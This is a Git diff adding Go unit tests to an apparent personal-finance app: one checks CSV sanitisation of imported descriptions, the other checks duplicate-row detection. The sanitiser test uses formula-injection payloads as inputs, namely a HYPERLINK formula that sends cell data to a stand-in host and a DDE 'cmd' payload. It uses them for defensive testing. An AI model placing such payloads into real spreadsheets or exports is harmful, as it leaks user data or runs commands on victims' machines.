@@ -3,8 +3,11 @@ package services
 import (
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/finance-sh/finance-sh/internal/entities"
+	"github.com/finance-sh/finance-sh/internal/repositories"
+	"github.com/finance-sh/finance-sh/pkg/imports"
 	"github.com/stretchr/testify/assert"
 )
 
@@ -68,4 +71,38 @@ func TestTranslateType(t *testing.T) {
 	assert.Equal(t, "transferência", translateType(entities.TxTransfer))
 	// Unknown falls back to lower-cased raw value.
 	assert.Equal(t, "unknown", translateType(entities.TransactionType("UNKNOWN")))
+}
+
+func TestCSVSafe(t *testing.T) {
+	cases := map[string]string{
+		"Mercado":                         "Mercado",
+		"":                                "",
+		`=HYPERLINK("http://x/?"&A1;"x")`: `'=HYPERLINK("http://x/?"&A1;"x")`,
+		"+cmd|' /C calc'!A0":              "'+cmd|' /C calc'!A0",
+		"-2+3":                            "'-2+3",
+		"@SUM(A1)":                        "'@SUM(A1)",
+		"\t=1":                            "'\t=1",
+		"Pix de João = amigo":             "Pix de João = amigo",
+	}
+	for in, want := range cases {
+		assert.Equal(t, want, csvSafe(in), in)
+	}
+}
+
+func TestClassifyRowSignature(t *testing.T) {
+	dia := time.Date(2026, 9, 1, 0, 0, 0, 0, time.UTC)
+	assinaturas := map[string]bool{repositories.SignatureKey(dia.Add(15*time.Hour), 1000, "Mercado"): true}
+	row := imports.ParsedRow{Date: dia, Description: "Mercado", AmountCents: 1000}
+	dupe, _ := classifyRow(row, map[string]bool{}, map[string]bool{}, assinaturas)
+	assert.True(t, dupe, "same day, amount and description is a duplicate")
+	row.AmountCents = 1001
+	dupe, _ = classifyRow(row, map[string]bool{}, map[string]bool{}, assinaturas)
+	assert.False(t, dupe)
+	row = imports.ParsedRow{Date: dia, Description: "Mercado", AmountCents: 1000, ExternalID: "x"}
+	seen := map[string]bool{}
+	dupe, _ = classifyRow(row, map[string]bool{}, seen, nil)
+	assert.False(t, dupe)
+	dupe, reason := classifyRow(row, map[string]bool{}, seen, nil)
+	assert.True(t, dupe, "repeated external id in the same file")
+	assert.Equal(t, "duplicado no arquivo", reason)
 }
